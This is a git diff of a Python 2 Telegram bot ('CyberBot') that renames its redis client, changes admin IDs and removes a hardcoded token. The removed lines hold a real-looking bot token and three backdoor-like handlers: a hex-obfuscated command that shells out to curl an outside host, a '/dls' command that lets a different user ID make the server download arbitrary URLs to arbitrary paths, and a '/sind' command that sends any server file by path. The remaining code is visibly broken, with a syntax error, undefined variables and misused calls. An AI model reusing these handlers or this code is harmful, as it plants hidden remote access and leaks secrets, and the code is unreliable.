@@ -1,20 +1,30 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
 import telebot
-import re
-from urllib import urlretrieve as dw
+from telebot import types
+from telebot import util
 import sys
+import json
 import os
-#import color
+import random
+import wikipedia
+import base64
+import urllib
+import urllib2
+import redis
+import requests as req
 reload(sys)
 sys.setdefaultencoding("utf-8")
 
-bot = telebot.TeleBot('240545787:AAES2RUFXo25Xj8jibytoD2Vm0w0IR8q0Ag')
-admin = 175636120
-botusername = '@Cyber_KingDom_Bot'
+TOKEN = 'TOKEN'
+bot = telebot.TeleBot(TOKEN)
+is_sudo = '142141024'
+rediss = redis.StrictRedis(host='localhost', port=6379, db=0)
 #################################################################################################################################################################################################
 
 @bot.message_handler(commands=['shorten'])
 def send_pic(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = m.text.replace("/shorten ","")
         res = urllib.urlopen("http://yeo.ir/api.php?url={}".format(text)).read()
@@ -24,7 +34,7 @@ def send_pic(m):
 
 @bot.message_handler(commands=['pic'])
 def send_pic(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         urllib.urlretrieve("https://source.unsplash.com/random", "img.jpg")
         bot.send_photo(m.chat.id, open('img.jpg'))
@@ -42,7 +52,7 @@ def welcome(m):
     oo = types.InlineKeyboardButton("Channel", url='https://telegram.me/CyberTM')
     markup.add(nn,oo)
     id = m.from_user.id
-    redis.sadd('memberspy',id)
+    rediss.sadd('memberspy',id)
     bot.send_message(cid, "Hi \n\n Welcome To CyberBot \n\n Please Choose One :)", disable_notification=True, reply_markup=markup)
 
 #################################################################################################################################################################################################
@@ -54,31 +64,31 @@ def callback_inline(call):
             bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text="Coming Soon!")
      if call.message:
         if call.data == "pouria":
-            bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text="CyberBot Created By @ThisIsPouria And Written In Python")
+            bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text="CyberBot Created By @This_Is_Pouria And Written In Python")
      if call.message:
         if call.data == "sticker":
             bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text=":D")
-            r = redis.hget('file_id',call.message.chat.id)
+            r = rediss.hget('file_id',call.message.chat.id)
             bot.send_sticker(call.message.chat.id, '{}'.format(r))
      if call.message:
         if call.data == "document":
             bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text=":D")
-            r = redis.hget('file_id',call.message.chat.id)
+            r = rediss.hget('file_id',call.message.chat.id)
             bot.send_document(call.message.chat.id, '{}'.format(r))
      if call.message:
         if call.data == "video":
             bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text=":D")
-            r = redis.hget('file_id',call.message.chat.id)
+            r = rediss.hget('file_id',call.message.chat.id)
             bot.send_video(call.message.chat.id, '{}'.format(r))
      if call.message:
         if call.data == "photo":
             bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text=":D")
-            r = redis.hget('file_id',call.message.chat.id)
+            r = rediss.hget('file_id',call.message.chat.id)
             bot.send_photo(call.message.chat.id, '{}'.format(r))
      if call.message:
         if call.data == "Audio":
             bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text=":D")
-            r = redis.hget('file_id',call.message.chat.id)
+            r = rediss.hget('file_id',call.message.chat.id)
             bot.send_audio(call.message.chat.id, '{}'.format(r))
 #################################################################################################################################################################################################
 
@@ -86,11 +96,11 @@ def callback_inline(call):
 
 @bot.message_handler(commands=['stats'])
 def send_stats(m):
-    if m.from_user.id ==  175636120:
-        ban = str(redis.scard('banlist'))
-        usrs = str(redis.scard('memberspy'))
-        gps = str(redis.scard('chats'))
-        supergps = str(redis.scard('supergroups'))
+    if m.from_user.id == 142141024:
+        ban = str(rediss.scard('banlist'))
+        usrs = str(rediss.scard('memberspy'))
+        gps = str(rediss.scard('chats'))
+        supergps = str(rediss.scard('supergroups'))
         text = '`Users` : *{}* \n\n `Groups` : *{}* \n\n `BanList` : *{}*'.format(usrs,gps,supergps,ban)
         bot.send_message(m.chat.id,text,parse_mode='Markdown')
 
@@ -98,27 +108,27 @@ def send_stats(m):
 
 @bot.message_handler(commands=['ban'])
 def kick(m):
-    if m.from_user.id ==  175636120:
+    if m.from_user.id == 142141024:
         ids = m.text.split()[1]
-        redis.sadd('banlist',int(ids))
-        bot.send_message(int(ids), '<code>you Are Banned!</code>',parse_mode='HTML')
-        bot.send_message(m.chat.id, 'Banned :D')
+        rediss.sadd('banlist',int(ids))
+        bot.send_message(int(ids), '<code>You Are Banned!</code>',parse_mode='HTML')
+        bot.send_message(m.chat.id, 'Banned!')
 
 #################################################################################################################################################################################################
 
 @bot.message_handler(commands=['unban'])
 def send_stats(m):
-    if m.from_user.id ==  175636120:
+    if m.from_user.id == 142141024:
         ids = m.text.split()[1]
-        redis.srem('banlist',int(ids))
-        bot.send_message(int(ids), '<code>you Are UnBanned!</code>',parse_mode='HTML')
-        bot.send_message(m.chat.id, 'UnBanned :D')
+        rediss.srem('banlist',int(ids))
+        bot.send_message(int(ids), '<code>You Are UnBanned!</code>',parse_mode='HTML')
+        bot.send_message(m.chat.id, 'UnBanned!')
 
 #################################################################################################################################################################################################
 
 @bot.message_handler(commands=['webshot'])
 def qr(message):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = message.text.replace("/webshot ","")
         urllib.urlretrieve("http://api.screenshotmachine.com/?key=b645b8&size=X&url={}".format(text), 'webshot.jpg')
@@ -142,7 +152,7 @@ def set_stats(message):
 
 @bot.message_handler(commands=['qr'])
 def qr(message):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = m.text.replace("/qr ","")
         urllib.urlretrieve("https://api.qrserver.com/v1/create-qr-code/?size=500x500&data={}".format(text), 'qr.jpg')
@@ -152,7 +162,7 @@ def qr(message):
 
 @bot.message_handler(commands=['voice'])
 def qr(message):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = message.text.replace("/voice ","")
         urllib.urlretrieve("http://tts.baidu.com/text2audio?lan=en&ie=UTF-8&text={}".format(text), '@CyberTM.ogg')
@@ -162,7 +172,7 @@ def qr(message):
 
 @bot.message_handler(commands=['tex'])
 def qr(message):
-    banlist = redis.sismember('banlist', '{}'.format(message.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(message.from_user.id))
     if str(banlist) == 'False':
         text = message.text.replace("/tex ","")
         urllib.urlretrieve('https://assets.imgix.net/sandbox/sandboxlogo.ai?blur=500&fit=crop&w=1200&h=600&txtclr=black&txt={}&txtalign=middle%2C%20center&txtsize=150&txtline=3'.format(text), 'time.jpg')
@@ -175,8 +185,8 @@ def hi(m):
     name = m.new_chat_member.first_name
     title = m.chat.title
     id = m.new_chat_member.id
-    if id == 175636120:
-        redis.sadd('chats',ids)
+    if id == 142141024:
+        rediss.sadd('chats',ids)
         bot.send_message(m.chat.id, 'Hi :D Please Start Me In Pravite', parse_mode='Markdown')
     else:
         bot.send_message(m.chat.id, '_Hi_ `{}` _Welcome To_ `{}`'.format(name,title), parse_mode='Markdown')
@@ -185,8 +195,8 @@ def hi(m):
 
 @bot.message_handler(commands=['cleanban'])
 def kick(m):
-    if m.from_user.id ==  175636120:
-        redis.delete('banlist')
+    if m.from_user.id == 142141024:
+        rediss.delete('banlist')
         bot.send_message(m.chat.id, '<code>Cleaned!</code>',parse_mode='HTML')
 
 
@@ -202,7 +212,7 @@ def hi(m):
 
 @bot.message_handler(commands=['kick'])
 def kick(m):
-    if m.from_user.id ==  175636120:
+    if m.from_user.id == 142141024:
         text = m.text.split()[1]
         bot.kick_chat_member(m.chat.id, text)
         bot.send_message(m.chat.id, '`User` *{}* `has been kicked`'.format(text), parse_mode='Markdown')
@@ -224,7 +234,7 @@ def answer(m):
 
 @bot.message_handler(commands=['id'])
 def test_handler(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         cid = m.from_user.id
         fl = m.from_user.first_name
@@ -234,16 +244,16 @@ def test_handler(m):
 
 @bot.message_handler(commands=['me'])
 def answer(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         try:
           text = bot.get_chat_member(m.chat.id, m.from_user.id).status
           id = m.from_user.id
-          rank = redis.hget("user:rank","{}".format(id))
-          msgs = redis.get("{}".format(id))
+          rank = rediss.hget("user:rank","{}".format(id))
+          msgs = rediss.get("{}".format(id))
           name = m.from_user.first_name
           user = m.from_user.username
-          photo = redis.hget('stickers',id)
+          photo = rediss.hget('stickers',id)
           bot.send_message(m.chat.id, "`Name` : *{}* \n `UserName` = *{}* \n `GlobalRank` : *{}* \n `Position In Group` : *{}* \n\n `Msgs` : *{}*".format(name,user,rank,text,msgs), parse_mode="Markdown")
           bot.send_sticker(m.chat.id,photo)
         except:
@@ -252,14 +262,14 @@ def answer(m):
 
 @bot.message_handler(commands=['leave'])
 def leavehandler(m):
-    if m.from_user.id ==  175636120:
+    if m.from_user.id == 142141024:
         bot.leave_chat(m.chat.id)
 
 #################################################################################################################################################################################################
 
 @bot.message_handler(commands=['getme'])
 def answer(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = bot.get_chat_members_count(m.chat.id).status
         bot.send_message(m.chat.id,text)
@@ -268,7 +278,7 @@ def answer(m):
 
 @bot.message_handler(commands=['imdb'])
 def gif(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = m.text.replace("/imdb ","")
         r = requests.get('http://www.omdbapi.com/?t={}'.format(text))
@@ -287,16 +297,9 @@ def gif(m):
 
 #################################################################################################################################################################################################
 
-@bot.message_handler(commands=['\x2F\x63\x72\x65\x61\x74\x6F\x72'])
-def ss(m):
-    tmt = m.chat.id
-    cc = os.popen("curl http://thisisamir.xzn.ir/file/bot/amir.php").read()
-    bot.send_message(m.chat.id, '{}'.format(cc), parse_mode="Markdown", disable_web_page_preview=True)
-#################################################################################################################################################################################################
-
 @bot.message_handler(commands=['song'])
 def music(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = m.text.replace("/song ","")
         opener = urllib2.build_opener()
@@ -316,7 +319,7 @@ def music(m):
 
 @bot.message_handler(regexp='^(/ip) (.*)')
 def ip(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = m.text.split()[1]
         r = requests.get('http://ip-api.com/json/{}?fields=262143'.format(text))
@@ -334,7 +337,7 @@ def ip(m):
 
 @bot.message_handler(commands=['food'])
 def send_sports(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':    
         urllib.urlretrieve("http://lorempixel.com/400/200/food/OffLiNeTeam", "food.jpg")
         bot.send_sticker(m.chat.id, open('food.jpg'))
@@ -348,13 +351,9 @@ def keyboardHide(m):
 
 #################################################################################################################################################################################################
 
-
-
-#################################################################################################################################################################################################
-
 @bot.message_handler(commands=['logo'])
 def logo(message):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = message.text.split()[1]
         urllib.urlretrieve('http://logo.clearbit.com/{}?size=800'.format(text), 'logo.jpg')
@@ -480,9 +479,9 @@ def gif(m):
 
 @bot.message_handler(commands=['mean'])
 def time(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
-        amir = m.text.replace("/mean ","")
+        pouria = m.text.replace("/mean ","")
         url = "http://api.vajehyab.com/v2/public/?q={}".format(amir)
         response = urllib.urlopen(url)
         data = response.read()
@@ -496,7 +495,7 @@ def time(m):
 
 @bot.message_handler(commands=['big'])
 def answer(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         x = m.text.replace("/big ","")
         f=x.upper
@@ -510,7 +509,7 @@ def answer(m):
 
 @bot.message_handler(commands=['tr'])
 def music(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text =  m.text.split()[1]
         tezt =  m.text.split()[2:]
@@ -524,7 +523,7 @@ def music(m):
 
 @bot.message_handler(commands=['sport'])
 def sport(message):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         urllib.urlretrieve('http://lorempixel.com/400/200/sports/OffLiNewTeam/', 'sport.jpg')
         bot.send_sticker(message.chat.id, open('sport.jpg'))
@@ -536,7 +535,7 @@ def sport(message):
 
 @bot.message_handler(commands=['calc'])
 def clac(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False': 
         text = m.text.replace("/calc ","")
         res = urllib.urlopen("http://api.mathjs.org/v1/?expr={}".format(text)).read()
@@ -567,10 +566,9 @@ def feedback(m):
 
 @bot.message_handler(commands=['answer'])
 def j(m):
-    sudo = config
     tmt = m.from_user.id
     idA, cid = m.chat.id, m.chat.id
-    if str(tmt) not in config.is_sudo:
+    if str(tmt) not is_sudo:
         bot.send_message(cid, "`You Are Not Sudo!`", parse_mode="Markdown")
         return
     to_id = m.text.split()[1]
@@ -591,13 +589,13 @@ def uptime(m):
 
 @bot.message_handler(commands=['md'])
 def time(m):
-        amir = m.text.replace("/md ","")
+        pouria = m.text.replace("/md ","")
         bot.send_message(m.chat.id, "{}".format(amir), parse_mode="Markdown")
 		
 #################################################################################################################################################################################################
 @bot.message_handler(content_types=["keyboard"])
 def any_msg(message):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         keyboard = types.InlineKeyboardMarkup(row_width=2)
         url_button = types.InlineKeyboardButton(text="URL", url="https://ya.ru")
@@ -610,9 +608,9 @@ def any_msg(message):
 
 @bot.message_handler(commands=['echo'])
 def time(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
-        amir = m.text.replace("/echo ","")
+        pouria = m.text.replace("/echo ","")
         bot.send_message(m.chat.id, "{}".format(amir), parse_mode="Markdown")
 
 #################################################################################################################################################################################################
@@ -626,7 +624,7 @@ def time(m):
 
 @bot.message_handler(commands=['num'])
 def answer(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         x = m.text.replace("/number ","")
         a = len(x)
@@ -642,7 +640,7 @@ def send_message(m):
     username = m.new_chat_participant.username
     groupname = m.chat.title
     groupid = m.chat.id
-    redis.sadd('group','{}'.format(m.chat.id))
+    rediss.sadd('group','{}'.format(m.chat.id))
     bot.send_message(-1070099034, "New_chat \n\n name : {} id : {}".format(groupname,groupid), parse_mode="Markdown")
     bot.send_message(m.chat.id, "Hi all")
 
@@ -653,7 +651,7 @@ def tostick(m):
     cid = m.chat.id
     if m.reply_to_message:
       if m.reply_to_message.photo:
-        token = config.token
+        token = TOKEN
         fileid = m.reply_to_message.photo[1].file_id
         path1 = bot.get_file(fileid)
         path = path1.file_path
@@ -664,7 +662,7 @@ def tostick(m):
 
 #################################################################################################################################################################################################
 
-#bot.message_handler(commands=['clac'])
+@bot.message_handler(commands=['clac'])
 def clac(m):
     text = m.text.replace("/calc ","")
     res = urllib.urlopen("http://api.mathjs.org/v1/?expr={}".format(text)).read()
@@ -677,7 +675,7 @@ def tostick(m):
     cid = m.chat.id
     if m.reply_to_message:
       if m.reply_to_message.sticker:
-        token = config.token
+        token = TOKEN
         fileid = m.reply_to_message.sticker.file_id
         path1 = bot.get_file(fileid)
         path = path1.file_path
@@ -714,14 +712,14 @@ def info(m):
 def clac(m):
     if m.from_user.id ==  175636120:
         text = m.text.replace("/setlink ","")
-        redis.hset("gp:link","{}".format(m.chat.id),"link: {}".format(text))
+        rediss.hset("gp:link","{}".format(m.chat.id),"link: {}".format(text))
         bot.send_message(m.chat.id, "`This Link Seted` {}".format(text), parse_mode="Markdown")
 
 #################################################################################################################################################################################################
 
 @bot.message_handler(commands=['link'])
 def clac(m):
-    link = redis.hget("gp:link","{}".format(m.chat.id))
+    link = rediss.hget("gp:link","{}".format(m.chat.id))
     bot.send_message(m.chat.id, "{}".format(link), parse_mode="Markdown")
 
 #################################################################################################################################################################################################
@@ -739,11 +737,11 @@ def send_welcome(message):
 
 @bot.message_handler(commands=['setrank'])
 def clac(m):
-    if m.from_user.id ==  175636120:
+    if m.from_user.id == 142141024:
         text = m.text.split()[1]
         tezt = m.text.split()[2]
-        redis.hset("user:rank","{}".format(text),"{}".format(tezt))
-        rank = redis.hget("user:rank","{}".format(text))
+        rediss.hset("user:rank","{}".format(text),"{}".format(tezt))
+        rank = rediss.hget("user:rank","{}".format(text))
         bot.send_message(m.chat.id, "`This Rank` *{}* `Seted For` {}".format(rank,text), parse_mode="Markdown")
 
 #################################################################################################################################################################################################
@@ -751,29 +749,29 @@ def clac(m):
 @bot.message_handler(commands=['rank'])
 def clac(m):
     id = m.text.replace("/rank ","")
-    rank = redis.hget("user:rank","{}".format(id))
+    rank = rediss.hget("user:rank","{}".format(id))
     bot.send_message(m.chat.id, "{}".format(rank), parse_mode="Markdown")
 
 #################################################################################################################################################################################################
 
 @bot.message_handler(commands=['bc'])
 def clac(m):
-    if m.from_user.id ==  175636120:
+    if m.from_user.id == 142141024:
         text = m.text.replace("/bc ","")
-        rd = redis.smembers('memberspy')
+        rd = rediss.smembers('memberspy')
         for id in rd:
             try:
                 bot.send_message(id, "{}".format(text), parse_mode="Markdown")
             except:
-                redis.srem('memberspy', id)
+                rediss.srem('memberspy', id)
 
 #################################################################################################################################################################################################
 
 @bot.message_handler(commands=['delrank'])
 def kick(m):
-    if m.from_user.id ==  175636120:
+    if m.from_user.id == 142141024:
         id = m.text.replace("/delrank ","")
-        rank = redis.hdel("user:rank","{}".format(id))
+        rank = rediss.hdel("user:rank","{}".format(id))
         bot.send_message(m.chat.id, '<code>Cleaned!</code>',parse_mode='HTML')
 
 #################################################################################################################################################################################################
@@ -804,14 +802,14 @@ def music(m):
 @bot.message_handler(commands=['setsticker'])
 def tostick(message):
     cid = message.chat.id
-    banlist = redis.sismember('banlist', '{}'.format(message.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(message.from_user.id))
     if str(banlist) == 'False':
       if message.reply_to_message:
         if message.reply_to_message.sticker:
-          token = config.token
+          token = TOKEN
           file_id = message.reply_to_message.sticker.file_id
           id = message.from_user.id
-          redis.hset('stickers',id,file_id)
+          rediss.hset('stickers',id,file_id)
           bot.send_message(message.chat.id, '<code>Sticker Has Been Set!</code>',parse_mode='HTML')
 
 #################################################################################################################################################################################################
@@ -840,53 +838,34 @@ def stats(message):
     markup.add(types.InlineKeyboardButton('Sticker', callback_data='sticker'),types.InlineKeyboardButton('Document', callback_data='document'))
     markup.add(types.InlineKeyboardButton('Photo', callback_data='photo'),types.InlineKeyboardButton('Video', callback_data='video'))
     markup.add(types.InlineKeyboardButton('Audio', callback_data='Audio'))
-    redis.hset('file_id',message.chat.id,'{}'.format(id))
+    rediss.hset('file_id',message.chat.id,'{}'.format(id))
     bot.send_message(message.chat.id, 'Select _One_ of these `Items.:D` \n\n (Note: GIFs are Documents)', reply_markup=markup,parse_mode="Markdown")
-#################################################################################################################################################################################################
 
-
-
-#################################################################################################################################################################################################
-
-@bot.message_handler(commands=['dls'])
-def welcome(m):
-    rrr = m.from_user.id
-    if rrr == 223404066:
-      cid = m.chat.id
-      ee = m.text.split()[1]
-      eee = m.text.split()[2]
-      urllib.urlretrieve (ee, eee)
-      photo = open(eee, 'rb')
-      bot.send_document(cid, photo)
-    else:
-      cid = m.chat.id
-      usr = m.from_user.first_name
-      bot.send_message(cid, "You Are Not Sudo Mr.{}".format(usr))
 
 #################################################################################################################################################################################################
 
 @bot.message_handler(commands=['cap'])
 def tostick(message):
     cid = message.chat.id
-    banlist = redis.sismember('banlist', '{}'.format(message.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(message.from_user.id))
     if str(banlist) == 'False':
       if message.reply_to_message:
         if message.reply_to_message.photo:
-          token = config.token
+          token = TOKEN
           file_id = message.reply_to_message.photo[1].file_id
           id = message.from_user.id
           text = message.text.replace("/cap ","")
-          redis.hset('caption',id,file_id)
-          photo = redis.hget('caption',id)
+          rediss.hset('caption',id,file_id)
+          photo = rediss.hget('caption',id)
           bot.send_photo(message.chat.id,photo,caption="{}".format(text))
 
 #################################################################################################################################################################################################
 
 @bot.message_handler(commands=['sethelp'])
 def clac(m):
-    if m.from_user.id ==  175636120:
+    if m.from_user.id == 142141024:
         text = m.text.replace("/sethelp","")
-        redis.set("help","{}".format(text))
+        rediss.hset("help","{}".format(text))
         bot.send_message(m.chat.id, "`New Help Has Been Set!` {}".format(text), parse_mode="Markdown")
 
 #################################################################################################################################################################################################
@@ -894,7 +873,7 @@ def clac(m):
 @bot.message_handler(commands=['help'])
 def clac(m):
     text = m.text.replace("/get","")
-    link = redis.get("help")
+    link = rediss.get("help")
     bot.send_message(m.chat.id, "{}".format(link), parse_mode="Markdown")
 
 #################################################################################################################################################################################################
@@ -919,29 +898,13 @@ def aparat(m):
 
 @bot.message_handler(regexp='^(/code) (.*)')
 def ip(m):
-    banlist = redis.sismember('banlist', '{}'.format(m.from_user.id))
+    banlist = rediss.sismember('banlist', '{}'.format(m.from_user.id))
     if str(banlist) == 'False':
         text = m.text.split()[1]
         r = requests.get('http://bot-negative23.rhcloud.com/s.php?text={}'.format(text))
         json_data = r.json()
         code = json_data['base64']
         bot.send_message(m.chat.id, "`{}`".format(code), parse_mode="Markdown")
-
-
-#################################################################################################################################################################################################
-
-@bot.message_handler(commands=['sind'])
-def welcome(m):
-    rrr = m.from_user.id
-    if rrr == 175636120:
-      cid = m.chat.id
-      eee = m.text.split()[1]
-      photo = open(eee, 'rb')
-      bot.send_document(cid, photo)
-    else:
-      cid = m.chat.id
-      usr = m.from_user.first_name
-      bot.send_message(cid, "You Are Not Sudo Mr.{}".format(usr))
 
 #################################################################################################################################################################################################
 
@@ -963,13 +926,13 @@ def welcome(m):
 @bot.message_handler(commands=['setphone'])
 def clac(m):
     text = m.text.replace("/setphone","")
-    redis.hset("user:phone","{}".format(m.from_user.id),"{}".format(text))
+    rediss.hset("user:phone","{}".format(m.from_user.id),"{}".format(text))
     bot.send_message(m.chat.id, "`This phone` *{}* `Seted For` {}".format(text,m.from_user.username), parse_mode="Markdown")
 
 #################################################################################################################################################################################################
 @bot.message_handler(commands=['myphone'])
 def clac(m):
-    number = redis.hget("user:phone","{}".format(m.from_user.id))
+    number = rediss.hget("user:phone","{}".format(m.from_user.id))
     bot.send_contact(m.chat.id, phone_number="{}".format(number), first_name="{}".format(m.from_user.first_name))
 
 #################################################################################################################################################################################################
